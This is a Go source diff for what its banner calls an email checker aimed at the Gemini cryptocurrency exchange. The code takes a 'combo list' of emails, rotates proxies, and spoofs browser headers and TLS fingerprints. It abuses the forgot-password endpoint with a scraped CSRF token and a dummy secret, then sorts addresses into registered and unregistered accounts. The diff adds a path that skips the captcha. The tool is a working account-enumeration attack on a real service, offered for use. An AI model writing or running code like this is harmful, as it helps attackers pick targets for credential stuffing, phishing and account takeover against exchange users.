@@ -29,17 +29,17 @@ import (
 )
 
 var (
-	checked    int32
-	valids     int32
-	invalids   int32
-	dupes      int32
-	cpmTimes   []int64
-	cpmMutex   sync.Mutex
-	stopFlag   int32
-	remainLock sync.Mutex
-	remaining  []string
-	wg         sync.WaitGroup
-	blackList  map[string]struct{}
+	checked        int32
+	valids         int32
+	invalids       int32
+	dupes          int32
+	cpmTimes       []int64
+	cpmMutex       sync.Mutex
+	stopFlag       int32
+	remainLock     sync.Mutex
+	remaining      []string
+	wg             sync.WaitGroup
+	blackList      map[string]struct{}
 	blacklistMutex sync.RWMutex
 )
 
@@ -299,6 +299,66 @@ func loadBlacklist() map[string]struct{} {
 	return blacklist
 }
 
+func buildHeaders(email string) fhttp.Header {
+	return fhttp.Header{
+		"accept":             {"application/json"},
+		"accept-encoding":    {"gzip, deflate, br, zstd"},
+		"accept-language":    {"en-US,en;q=0.9"},
+		"content-type":       {"application/json"},
+		"csrf-token":         {"nocheck"},
+		"origin":             {"https://exchange.gemini.com"},
+		"priority":           {"u=1, i"},
+		"referer":            {fmt.Sprintf("https://exchange.gemini.com/signin/forgot?email=%s", email)},
+		"sec-ch-ua":          {"\"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\""},
+		"sec-ch-ua-mobile":   {"?0"},
+		"sec-ch-ua-platform": {"\"Windows\""},
+		"sec-fetch-dest":     {"empty"},
+		"sec-fetch-mode":     {"cors"},
+		"sec-fetch-site":     {"same-origin"},
+		"user-agent":         {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"},
+	}
+}
+
+func getCSRF(client tls_client.HttpClient, email string) (string, error) {
+	user, domain, _ := strings.Cut(email, "@")
+	url := fmt.Sprintf("https://exchange.gemini.com/signin/forgot/confirm?email=%s%%40%s", strings.ToLower(user), strings.ToLower(domain))
+	for i := 0; i < 5; i++ {
+		req, err := fhttp.NewRequest("GET", url, nil)
+		if err != nil {
+			return "", err
+		}
+		req.Header = buildHeaders(email)
+		resp, err := client.Do(req)
+		if err != nil {
+			time.Sleep(500 * time.Millisecond)
+			continue
+		}
+		body, err := ioutil.ReadAll(resp.Body)
+		resp.Body.Close()
+		if err != nil {
+			time.Sleep(500 * time.Millisecond)
+			continue
+		}
+		var data map[string]interface{}
+		if err := json.Unmarshal(body, &data); err != nil {
+			continue
+		}
+		pp, ok := data["pageProps"].(map[string]interface{})
+		if !ok {
+			continue
+		}
+		form, ok := pp["form"].(map[string]interface{})
+		if !ok {
+			continue
+		}
+		token, ok := form["csrfToken"].(string)
+		if ok && strings.ToLower(token) != "nocsrf" {
+			return token, nil
+		}
+	}
+	return "", fmt.Errorf("csrf token not found")
+}
+
 func checkEmail(email string, proxy string, folder string, clientKey string) {
 	defer wg.Done()
 
@@ -308,12 +368,12 @@ func checkEmail(email string, proxy string, folder string, clientKey string) {
 		remainLock.Unlock()
 		return
 	}
-	
+
 	// Check if email is in blacklist
 	blacklistMutex.RLock()
 	_, isDupe := blackList[strings.ToLower(email)]
 	blacklistMutex.RUnlock()
-	
+
 	if isDupe {
 		fmt.Printf("[DUPE] %s\n", email)
 		saveDupe(email, folder)
@@ -513,6 +573,115 @@ func checkEmail(email string, proxy string, folder string, clientKey string) {
 	fmt.Printf("[FAILED] %s | Max retries reached. Last error: %v\n", email, lastErr)
 }
 
+func checkEmailCaptchaless(email string, proxy string, folder string) {
+	if atomic.LoadInt32(&stopFlag) == 1 {
+		remainLock.Lock()
+		remaining = append(remaining, email)
+		remainLock.Unlock()
+		return
+	}
+
+	blacklistMutex.RLock()
+	_, isDupe := blackList[strings.ToLower(email)]
+	blacklistMutex.RUnlock()
+
+	if isDupe {
+		fmt.Printf("[DUPE] %s\n", email)
+		saveDupe(email, folder)
+		atomic.AddInt32(&checked, 1)
+		cpmMutex.Lock()
+		cpmTimes = append(cpmTimes, time.Now().Unix())
+		cpmMutex.Unlock()
+		return
+	}
+
+	proxyURL, err := parseProxy(proxy)
+	if err != nil {
+		fmt.Printf("[FAILED] %s | %v\n", email, err)
+		return
+	}
+
+	options := []tls_client.HttpClientOption{
+		tls_client.WithTimeoutSeconds(30),
+		tls_client.WithClientProfile(profiles.Okhttp4Android13),
+		tls_client.WithProxyUrl(proxyURL.String()),
+	}
+
+	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
+	if err != nil {
+		fmt.Printf("[FAILED] %s | %v\n", email, err)
+		return
+	}
+
+	csrfToken, err := getCSRF(client, email)
+	if err != nil {
+		atomic.AddInt32(&checked, 1)
+		atomic.AddInt32(&invalids, 1)
+		cpmMutex.Lock()
+		cpmTimes = append(cpmTimes, time.Now().Unix())
+		cpmMutex.Unlock()
+		fmt.Printf("[FAILED] %s | %v\n", email, err)
+		return
+	}
+
+	payload := map[string]string{
+		"csrfToken": csrfToken,
+		"secret":    "424242",
+	}
+	bodyBytes, _ := json.Marshal(payload)
+
+	user, domain, _ := strings.Cut(email, "@")
+	url := fmt.Sprintf("https://exchange.gemini.com/signin/forgot/confirm?email=%s%%40%s", strings.ToLower(user), strings.ToLower(domain))
+
+	req, err := fhttp.NewRequest("POST", url, bytes.NewReader(bodyBytes))
+	if err != nil {
+		fmt.Printf("[FAILED] %s | %v\n", email, err)
+		return
+	}
+	req.Header = buildHeaders(email)
+
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Printf("[FAILED] %s | %v\n", email, err)
+		return
+	}
+	respBody, _ := ioutil.ReadAll(resp.Body)
+	resp.Body.Close()
+
+	atomic.AddInt32(&checked, 1)
+	cpmMutex.Lock()
+	cpmTimes = append(cpmTimes, time.Now().Unix())
+	cpmMutex.Unlock()
+
+	var jsonResp map[string]interface{}
+	json.Unmarshal(respBody, &jsonResp)
+	errorsStr := ""
+	if form, ok := jsonResp["form"].(map[string]interface{}); ok {
+		if errs, ok := form["errors"]; ok {
+			errorsStr = strings.ToLower(fmt.Sprint(errs))
+		}
+	}
+	bodyStr := string(respBody)
+
+	switch {
+	case strings.Contains(errorsStr, "secret"):
+		fmt.Printf("[VALID] %s\n", email)
+		saveValid(email, folder)
+	case strings.Contains(bodyStr, "too many password reset attempts"):
+		fmt.Printf("[LIMITED] %s\n", email)
+		saveValid(email+" [RESET LIMITED]", folder)
+	case strings.Contains(bodyStr, "Please use a valid email address"):
+		fmt.Printf("[INVALID EMAIL] %s\n", email)
+		saveInvalid(email, folder)
+	case strings.Contains(errorsStr, "email"):
+		fmt.Printf("[INVALID] %s\n", email)
+		saveInvalid(email, folder)
+	default:
+		fmt.Printf("[UNKNOWN] %s | %s\n", email, bodyStr)
+		saveBans(email, folder)
+	}
+}
+
 func uuid() string {
 	b := make([]byte, 16)
 	rand.Read(b)
@@ -525,7 +694,7 @@ func uuid() string {
 func main() {
 	fmt.Println("Gemini mobile.gemini.com email checker by sezam")
 	fmt.Println("Version: 1.0")
-	
+
 	// Initialize blacklist
 	blackList = loadBlacklist()
 	comboFile := getFilePath("Select Combo List")
@@ -556,12 +725,12 @@ func main() {
 	if err != nil {
 		log.Fatalf("Failed to create output folder: %v", err)
 	}
-	
+
 	for _, email := range emails {
 		blacklistMutex.RLock()
 		_, isDupe := blackList[strings.ToLower(email)]
 		blacklistMutex.RUnlock()
-		
+
 		if isDupe {
 			fmt.Printf("[DUPE] %s\n", email)
 			saveDupe(email, folder)
@@ -572,18 +741,16 @@ func main() {
 			validEmails = append(validEmails, email)
 		}
 	}
-	
+
 	fmt.Printf("\n=== FOUND %d DUPLICATES ===\n\n", dupeCount)
 	fmt.Printf("=== CONTINUING WITH %d VALID EMAILS ===\n\n", len(validEmails))
-	
+
 	fmt.Print("How many threads to use? ")
 	var threadCount int
 	_, err = fmt.Scanln(&threadCount)
 	if err != nil || threadCount < 1 {
 		log.Fatal("Invalid thread count")
 	}
-
-	clientKey := loadKey()
 
 	emailCh := make(chan string)
 
@@ -594,7 +761,7 @@ func main() {
 			for email := range emailCh {
 				proxy := proxies[rand.Intn(len(proxies))]
 				wg.Add(1)
-				checkEmail(email, proxy, folder, clientKey)
+				checkEmailCaptchaless(email, proxy, folder)
 			}
 		}(i)
 	}
